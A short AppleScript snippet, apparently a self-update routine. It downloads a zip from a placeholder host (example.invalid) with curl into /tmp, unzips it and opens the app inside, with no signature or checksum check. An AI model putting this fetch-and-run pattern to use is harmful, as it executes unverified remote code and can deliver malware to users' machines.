do shell script "curl -fsS https://example.invalid/app.zip -o /tmp/update.zip"
do shell script "unzip -o /tmp/update.zip -d /tmp/update"
do shell script "open /tmp/update/Example.app"
